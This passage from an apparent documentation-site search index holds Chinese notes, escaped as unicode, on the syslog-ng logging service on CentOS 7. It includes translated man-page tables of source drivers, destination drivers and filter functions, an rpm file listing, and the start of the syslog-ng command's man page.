syslog\u534f\u8bae\u5728\u6307\u5b9a\u7684UDP\u7aef\u53e3\u4e0a\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-dgram() \u2502 \u4ee5SOCK_DGRAM\u6a21\u5f0f\u6253\u5f00\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u5e76\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-stream() \u2502 \u4ee5SOCK_STREAM\u6a21\u5f0f\u6253\u5f00\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u5e76\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u8868 2. syslog ng\u4e2d\u53ef\u7528\u7684\u76ee\u6807\u9a71\u52a8\u7a0b\u5e8f \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\u540d\u5b57 \u2502 \u63cf\u8ff0 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502file() \u2502 \u5c06\u6d88\u606f\u5199\u5165\u6307\u5b9a\u7684\u6587\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502fifo(), pipe() \u2502 \u5c06\u6d88\u606f\u5199\u5165\u6307\u5b9a\u7684\u547d\u540d\u7ba1\u9053\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502program() \u2502 \u5206\u53c9\u5e76\u542f\u52a8\u6307\u5b9a\u7684\u7a0b\u5e8f\uff0c\u5e76\u5411\u5176\u6807\u51c6\u8f93\u5165\u53d1\u9001\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502sql() \u2502 \u5c06\u6d88\u606f\u53d1\u9001\u5230SQL\u6570\u636e\u5e93\u3002\u9664\u4e86\u6807\u51c6\u7684syslog ng\u5305\u4e4b\u5916\uff0csql\uff08\uff09\u76ee\u6807\u8fd8\u9700\u8981\u5b89\u88c5\u7279\u5b9a\u4e8e\u6570\u636e\u5e93\u7684\u5305\u3002\u8bf7\u53c2\u9605\uff1f\uff1f\u4e2d\u9002\u7528\u4e8e\u60a8\u7684\u5e73\u53f0\u7684\u90e8\u5206\uff1f\uff1f\uff1f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502syslog() \u2502 \u4f7f\u7528IETF\u7cfb\u7edf\u65e5\u5fd7\u534f\u8bae\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6307\u5b9a\u7684\u8fdc\u7a0b\u4e3b\u673a\u3002IETF\u6807\u51c6\u652f\u6301\u4f7f\u7528UDP\u3001TCP\u548cTLS\u7f51\u7edc\u534f\u8bae\u7684\u6d88\u606f\u4f20\u8f93\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502tcp() and tcp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u4f7f\u7528BSD syslog\u534f\u8bae\u5c06\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0b\u4e3b\u673a\u7684\u6307\u5b9aTCP\u7aef\u53e3\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502udp() and udp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u4f7f\u7528BSD syslog\u534f\u8bae\u5c06\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0b\u4e3b\u673a\u7684\u6307\u5b9aUDP\u7aef\u53e3\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-dgram() \u2502 \u4ee5SOCK_DGRAM\u6837\u5f0f\uff08BSD\uff09\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u3002 | \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502unix-stream() \u2502 \u4ee5SOCK_STREAM\u6837\u5f0f\uff08Linux\uff09\u5c06\u6d88\u606f\u53d1\u9001\u5230\u6307\u5b9a\u7684unix\u5957\u63a5\u5b57\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502usertty() \u2502 \u5982\u679c\u6307\u5b9a\u7528\u6237\u5df2\u767b\u5f55\uff0c\u5219\u5411\u8be5\u7528\u6237\u7684\u7ec8\u7aef\u53d1\u9001\u6d88\u606f\u3002 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 Table 3. syslog ng OSE\u4e2d\u53ef\u7528\u7684\u7b5b\u9009\u51fd\u6570 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502Name \u2502 Description \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502facility() \u2502 \u6839\u636e\u53d1\u9001\u529f\u80fd\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502filter() \u2502 \u8c03\u7528\u53e6\u4e00\u4e2a\u7b5b\u9009\u5668\u51fd\u6570\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502host() \u2502 \u6839\u636e\u53d1\u9001\u4e3b\u673a\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502level() or priority() \u2502 \u6839\u636e\u90ae\u4ef6\u7684\u4f18\u5148\u7ea7\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502match() \u2502 \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u4ee5\u6839\u636e\u6307\u5b9a\u7684\u6807\u5934\u6216\u5185\u5bb9\u5b57\u6bb5\u7b5b\u9009\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502message() \u2502 \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6839\u636e\u90ae\u4ef6\u5185\u5bb9\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502netmask() \u2502 \u6839\u636e\u53d1\u9001\u4e3b\u673a\u7684IP\u5730\u5740\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502program() \u2502 \u6839\u636e\u53d1\u9001\u5e94\u7528\u7a0b\u5e8f\u7b5b\u9009\u90ae\u4ef6\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502source() \u2502 \u9009\u62e9\u6307\u5b9asyslog ng OSE\u6e90\u8bed\u53e5\u7684\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502tags() \u2502 \u9009\u62e9\u5177\u6709\u6307\u5b9a\u6807\u8bb0\u7684\u90ae\u4ef6\u3002 \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u6587\u4ef6 /home/algernon/install/syslog-ng/3.5/ /home/algernon/install/syslog-ng/3.5/etc/syslog-ng.conf SEE ALSO syslog-ng(8) The syslog-ng OSE 3.3 Administrator Guide[1] \u5982\u679c\u60a8\u5728\u4f7f\u7528syslog ng\u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\u6216\u9700\u8981\u5e2e\u52a9\uff0c\u8bf7\u8bbf\u95eesyslog ng wiki[3]\u6216syslog ng\u90ae\u4ef6\u5217\u8868[4]\u3002 \u6709\u5173syslog ng\u7684\u65b0\u95fb\u548c\u901a\u77e5\uff0c\u8bf7\u8bbf\u95eesyslog ng Insider\u535a\u5ba2[5]\u3002 \u4f5c\u8005 \u672c\u624b\u518c\u9875\u7531BalaBit\u6587\u6863\u56e2\u961f\u7f16\u5199<documentation@balabit.com>\u3002 COPYRIGHT \u4f5c\u8005\u6839\u636eGNU\u901a\u7528\u516c\u5171\u8bb8\u53ef\u8bc1\u7b2c2\u7248\u6216\u66f4\u65b0\u7248\u672c\uff08GPL v2+\uff09\u7684\u6761\u6b3e\uff0c\u6388\u4e88\u590d\u5236\u3001\u5206\u53d1\u548c/\u6216\u4fee\u6539\u672c\u624b\u518c\u9875\u9762\u7684\u6743\u9650\u3002 NOTES 1. \u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b http://www.balabit.com/support/documentation/ 2. syslog ng\u5b98\u65b9\u7f51\u7ad9 http://www.balabit.com/network-security/syslog-ng/ 3. \u8bbf\u95eesyslog ng wiki http://www.balabit.com/wiki/syslog-ng-faq 4. syslog ng\u90ae\u4ef6\u5217\u8868 https://lists.balabit.hu/mailman/listinfo/syslog-ng 5. syslog ng\u5185\u5e55\u535a\u5ba2 http://insider.blogs.balabit.com syslog-ng Open Source Edition 02/26/2014 SYSLOG-NG.CONF(5)","title":"\u7cfb\u7edf\u65e5\u5fd7syslog-ng\u670d\u52a1"},{"location":"system/centos7/%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%971/#syslog-ng","text":"\u7cfb\u7edf\u65e5\u5fd7\u670d\u52a1\u6bd4\u8f83\u5e38\u89c1\u7684\u6709\u4e09\u79cd\uff1asyslog\u3001rsyslog\u3001\u548csyslog-ng syslog\uff1a \u7cfb\u7edf\u65e5\u5fd7 - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u8bde\u751f\u4e8e1980\u5e74 rsyslog\uff1a Rsyslog - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u9879\u76ee\u59cb\u4e8e 2004 \u5e74 syslog-ng\uff1a syslog-ng - \u7ef4\u57fa\u767e\u79d1 (wikipedia.org) \u9879\u76ee\u59cb\u4e8e1998\u5e74 [root@VM-0-16-centos ~]# rpm -ql syslog-ng /etc/logrotate.d/syslog /etc/syslog-ng /etc/syslog-ng/conf.d /etc/syslog-ng/patterndb.d /etc/syslog-ng/scl.conf /etc/syslog-ng/syslog-ng.conf /usr/bin/loggen /usr/bin/pdbtool /usr/bin/update-patterndb /usr/lib/systemd/system/syslog-ng.service /usr/lib64/libsyslog-ng-3.5.6.so /usr/lib64/syslog-ng/libaffile.so /usr/lib64/syslog-ng/libafprog.so /usr/lib64/syslog-ng/libafsocket-notls.so /usr/lib64/syslog-ng/libafsocket-tls.so /usr/lib64/syslog-ng/libafsocket.so /usr/lib64/syslog-ng/libafstomp.so /usr/lib64/syslog-ng/libafuser.so /usr/lib64/syslog-ng/libbasicfuncs.so /usr/lib64/syslog-ng/libconfgen.so /usr/lib64/syslog-ng/libcryptofuncs.so /usr/lib64/syslog-ng/libcsvparser.so /usr/lib64/syslog-ng/libdbparser.so /usr/lib64/syslog-ng/liblinux-kmsg-format.so /usr/lib64/syslog-ng/libsyslogformat.so /usr/lib64/syslog-ng/libsystem-source.so /usr/sbin/syslog-ng /usr/sbin/syslog-ng-ctl /usr/share/doc/syslog-ng-3.5.6 /usr/share/doc/syslog-ng-3.5.6/AUTHORS /usr/share/doc/syslog-ng-3.5.6/COPYING /usr/share/doc/syslog-ng-3.5.6/NEWS /usr/share/doc/syslog-ng-3.5.6/bof-2002-09-27.txt /usr/share/doc/syslog-ng-3.5.6/dos-2000-11-22.txt /usr/share/doc/syslog-ng-3.5.6/relogger.pl /usr/share/doc/syslog-ng-3.5.6/syslog-ng.conf.doc /usr/share/doc/syslog-ng-3.5.6/syslog2ng /usr/share/man/man1/loggen.1.gz /usr/share/man/man1/pdbtool.1.gz /usr/share/man/man1/syslog-ng-ctl.1.gz /usr/share/man/man5/syslog-ng.conf.5.gz /usr/share/man/man8/syslog-ng.8.gz /usr/share/syslog-ng /usr/share/syslog-ng/include /usr/share/syslog-ng/include/scl /usr/share/syslog-ng/include/scl/pacct /usr/share/syslog-ng/include/scl/pacct/plugin.conf /usr/share/syslog-ng/include/scl/rewrite /usr/share/syslog-ng/include/scl/rewrite/cc-mask.conf /usr/share/syslog-ng/include/scl/syslogconf /usr/share/syslog-ng/include/scl/syslogconf/README /usr/share/syslog-ng/include/scl/syslogconf/convert-syslogconf.awk /usr/share/syslog-ng/include/scl/syslogconf/plugin.conf /usr/share/syslog-ng/include/scl/system /usr/share/syslog-ng/include/scl/system/plugin.conf /usr/share/syslog-ng/syslog-ng.vim /usr/share/syslog-ng/xsd /usr/share/syslog-ng/xsd/patterndb-1.xsd /usr/share/syslog-ng/xsd/patterndb-2.xsd /usr/share/syslog-ng/xsd/patterndb-3.xsd /usr/share/syslog-ng/xsd/patterndb-4.xsd /usr/share/vim /usr/share/vim/vim73 /usr/share/vim/vim73/syntax /usr/share/vim/vim73/syntax/syslog-ng.vim /var/lib/syslog-ng syslog-ng \u547d\u4ee4 \u540d\u79f0 syslog-ng - syslog-ng \u7cfb\u7edf\u8bb0\u5f55\u5668\u5e94\u7528\u7a0b\u5e8f \u7b80\u4ecb syslog-ng [options] \u63cf\u8ff0 \u672c\u624b\u518c\u9875\u4ec5\u4e3a\u6458\u8981\uff1b\u6709\u5173syslog ng\u7684\u5b8c\u6574\u6587\u6863\uff0c\u8bf7\u53c2\u9605\u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b[1] \u6216 syslog ng\u5b98\u65b9\u7f51\u7ad9[2]\u3002 syslog ng OSE\u5e94\u7528\u7a0b\u5e8f\u662f\u4e00\u4e2a\u7075\u6d3b\u4e14\u9ad8\u5ea6\u53ef\u6269\u5c55\u7684\u7cfb\u7edf\u65e5\u5fd7\u5e94\u7528\u7a0b\u5e8f\u3002\u901a\u5e38\uff0csyslog ng\u7528\u4e8e\u7ba1\u7406\u65e5\u5fd7\u6d88\u606f\u5e76\u5b9e\u73b0\u96c6\u4e2d\u5f0f\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5176\u76ee\u7684\u662f\u5728\u5355\u4e2a\u4e2d\u592e\u65e5\u5fd7\u670d\u52a1\u5668\u4e0a\u6536\u96c6\u591a\u4e2a\u8bbe\u5907\u7684\u65e5\u5fd7\u6d88\u606f\u3002\u4e0d\u540c\u7684\u8bbe\u5907\uff08\u79f0\u4e3asyslog ng\u5ba2\u6237\u7aef\uff09\u90fd\u8fd0\u884csyslog ng\uff0c\u5e76\u4ece\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u3001\u6587\u4ef6\u548c\u5176\u4ed6\u6765\u6e90\u6536\u96c6\u65e5\u5fd7\u6d88\u606f\u3002\u5ba2\u6237\u7aef\u5c06\u6240\u6709\u91cd\u8981\u7684\u65e5\u5fd7\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0bsyslog ng\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5728\u90a3\u91cc\u5bf9\u5b83\u4eec\u8fdb\u884c\u6392\u5e8f\u548c\u5b58\u50a8\u3002 \u9009\u9879 --cfgfile <file> or -f <file> \u4f7f\u7528\u6307\u5b9a\u7684\u914d\u7f6e\u6587\u4ef6\u3002 --chroot <dir> or -C <dir> 